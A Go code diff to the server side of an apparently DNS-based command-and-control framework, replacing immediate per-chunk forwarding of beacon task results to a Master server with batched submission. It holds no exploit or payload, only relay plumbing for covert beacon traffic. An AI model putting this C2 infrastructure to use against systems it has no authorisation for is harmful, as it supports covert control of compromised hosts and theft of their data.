@@ -94,6 +94,8 @@ type C2Manager struct {
 	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
 	knownDomains         []string                        // Active DNS domains from Master (for first check-in)
 	db                   *Database                       // Database for persistent storage
+	resultBatchBuffer    map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
+	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
 	mutex                sync.RWMutex
 	taskCounter          int
 	debug                bool
@@ -137,6 +139,8 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		stagerSessions:       make(map[string]*StagerSession),
 		cachedStagerSessions: make(map[string]*CachedStagerSession),
 		recentMessages:       make(map[string]time.Time),
+		resultBatchBuffer:    make(map[string][]ResultChunk),
+		resultBatchTimer:     make(map[string]*time.Timer),
 		db:                   db,
 		taskCounter:          TaskCounterStart,
 		debug:                debug,
@@ -1389,44 +1393,11 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 		c2.mutex.Unlock()
 	}
 
-	// SHADOW MESH: Forward chunk IMMEDIATELY to Master (don't wait for all chunks)
-	// Master will handle reassembly from chunks received by ALL DNS servers
-	if masterClient != nil {
-		go func(tid, bid string, chunkIdx, total int, chunkData string) {
-			// Get the master task ID
-			c2.mutex.RLock()
-			masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
-			c2.mutex.RUnlock()
-
-			submitTaskID := tid
-			if hasMasterID {
-				submitTaskID = masterTaskID
-			}
-
-			// Forward chunk to Master for reassembly
-			taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, chunkIdx, total, chunkData)
-			if err != nil {
-				if c2.debug {
-					logf("[C2] Failed to forward chunk to master: %v", err)
-				}
-			} else {
-				if taskComplete {
-					// Master signaled task is complete - clear from beacon's current task
-					c2.mutex.Lock()
-					if beacon, exists := c2.beacons[bid]; exists {
-						if beacon.CurrentTask == tid {
-							beacon.CurrentTask = ""
-							if c2.debug {
-								logf("[C2] Task %s completed (after chunk %d/%d), cleared from beacon %s CurrentTask", tid, chunkIdx, total, bid)
-							}
-						}
-					}
-					c2.mutex.Unlock()
-				} else if c2.debug && chunkIdx%10 == 0 {
-					logf("[C2] Forwarded chunk %d/%d to Master for task %s", chunkIdx, total, submitTaskID)
-				}
-			}
-		}(taskID, beaconID, chunkIndex, totalChunks, data)
+	// SHADOW MESH: Queue chunk for batched submission to Master
+	// Batching reduces Master load by sending 10 chunks at a time
+	// This prevents overwhelming Master with thousands of concurrent requests
+	if masterClient != nil && !isDuplicate {
+		c2.submitResultChunkBatched(taskID, beaconID, chunkIndex, totalChunks, data, masterClient)
 	} // Local tracking for fallback/redundancy (but don't rely on it for Shadow Mesh)
 	if hasExpectation {
 		c2.mutex.Lock()
@@ -1442,6 +1413,116 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	}
 
 	return "ACK"
+}
+
+// submitResultChunkBatched queues a chunk for batched submission to Master
+// Reduces Master load by sending 10 chunks at a time instead of individual requests
+func (c2 *C2Manager) submitResultChunkBatched(taskID, beaconID string, chunkIndex, totalChunks int, data string, masterClient *MasterClient) {
+	const BATCH_SIZE = 10                        // Send 10 chunks per batch
+	const BATCH_TIMEOUT = 500 * time.Millisecond // Or flush after 500ms
+
+	chunk := ResultChunk{
+		BeaconID:    beaconID,
+		TaskID:      taskID,
+		ChunkIndex:  chunkIndex,
+		TotalChunks: totalChunks,
+		Data:        data,
+		ReceivedAt:  time.Now(),
+	}
+
+	c2.mutex.Lock()
+
+	// Add chunk to buffer
+	c2.resultBatchBuffer[taskID] = append(c2.resultBatchBuffer[taskID], chunk)
+	bufferLen := len(c2.resultBatchBuffer[taskID])
+
+	// Cancel existing timer if any
+	if timer, exists := c2.resultBatchTimer[taskID]; exists {
+		timer.Stop()
+		delete(c2.resultBatchTimer, taskID)
+	}
+
+	// Check if we should flush now
+	shouldFlush := false
+	if bufferLen >= BATCH_SIZE {
+		shouldFlush = true
+	} else if chunkIndex == totalChunks {
+		// Last chunk - flush immediately
+		shouldFlush = true
+	}
+
+	if shouldFlush {
+		// Flush the batch
+		batch := c2.resultBatchBuffer[taskID]
+		delete(c2.resultBatchBuffer, taskID)
+		c2.mutex.Unlock()
+
+		// Submit batch in background
+		go c2.flushResultBatch(batch, taskID, masterClient)
+	} else {
+		// Set timer to flush after timeout
+		c2.resultBatchTimer[taskID] = time.AfterFunc(BATCH_TIMEOUT, func() {
+			c2.mutex.Lock()
+			batch := c2.resultBatchBuffer[taskID]
+			delete(c2.resultBatchBuffer, taskID)
+			delete(c2.resultBatchTimer, taskID)
+			c2.mutex.Unlock()
+
+			if len(batch) > 0 {
+				c2.flushResultBatch(batch, taskID, masterClient)
+			}
+		})
+		c2.mutex.Unlock()
+	}
+}
+
+// flushResultBatch sends a batch of result chunks to Master
+func (c2 *C2Manager) flushResultBatch(batch []ResultChunk, taskID string, masterClient *MasterClient) {
+	if len(batch) == 0 {
+		return
+	}
+
+	// Get master task ID
+	c2.mutex.RLock()
+	masterTaskID, hasMasterID := c2.masterTaskIDs[taskID]
+	c2.mutex.RUnlock()
+
+	submitTaskID := taskID
+	if hasMasterID {
+		submitTaskID = masterTaskID
+	}
+
+	if c2.debug {
+		logf("[C2] Flushing batch of %d chunks for task %s", len(batch), submitTaskID)
+	}
+
+	// Submit each chunk in the batch
+	var lastComplete bool
+	for _, chunk := range batch {
+		taskComplete, err := masterClient.SubmitResult(submitTaskID, chunk.BeaconID, chunk.ChunkIndex, chunk.TotalChunks, chunk.Data)
+		if err != nil {
+			if c2.debug {
+				logf("[C2] Failed to submit chunk %d in batch: %v", chunk.ChunkIndex, err)
+			}
+			// Continue submitting rest of batch even if one fails
+		} else {
+			lastComplete = taskComplete
+		}
+	}
+
+	// If task is complete, clear from beacon's current task
+	if lastComplete {
+		c2.mutex.Lock()
+		if beacon, exists := c2.beacons[batch[0].BeaconID]; exists {
+			if beacon.CurrentTask == taskID {
+				beacon.CurrentTask = ""
+				if c2.debug {
+					logf("[C2] Task %s completed (batch flush), cleared from beacon %s CurrentTask", taskID, batch[0].BeaconID)
+				}
+			}
+		}
+		c2.mutex.Unlock()
+	}
 }
 
 // generateDeterministicSessionID creates a consistent session ID based on stager IP + binary ID
